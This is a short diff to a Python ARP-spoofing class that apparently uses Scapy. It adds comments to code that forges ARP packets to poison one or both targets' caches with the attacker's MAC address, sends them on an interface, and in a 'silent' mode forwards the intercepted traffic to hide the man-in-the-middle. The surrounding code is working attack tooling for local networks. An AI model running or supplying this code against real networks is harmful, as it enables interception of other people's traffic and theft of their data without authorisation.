@@ -29,11 +29,13 @@ class ArpSpoofing():
 
         #Arp part of packet
         arpPartList = []
+        # if one way is the option selected then only target 1 is poisoned to think that target 2 is at out mac address
         if oneway == True:
             for i in range(len(target1)):
                 for j in range(len(target2)):
                     arpPart = ARP(op="who-has", hwsrc=myMac, psrc=target2[j], hwdst=target1MAC[i], pdst=target1[i])
                     arpPartList.append(arpPart)
+        # if one way is not the option selected then both target 1 and 2 are poisoned
         elif oneway == False:
             for i in range(len(target1)):
                 for j in range(len(target2)):
@@ -51,6 +53,7 @@ class ArpSpoofing():
         for item in packetList:
             sendp(item, iface=self.interface, verbose=False)
         print("Spoof Spoof")
+        # if silent mode is enabled redirect the traffic to the correct receivers
         if silent == True:
             redirecting = TrafficRedirect(self.interface)
             try:
